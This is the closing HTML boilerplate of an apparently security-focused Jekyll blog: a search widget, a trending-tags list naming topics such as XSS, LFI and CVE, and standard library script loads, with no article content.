<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/api/">API</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cve/">CVE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/fuzz/">Fuzz</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/lfi/">LFI</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/sudoers/">SUDOERS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/app/">App</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/blind-xss/">Blind XSS</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->




  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

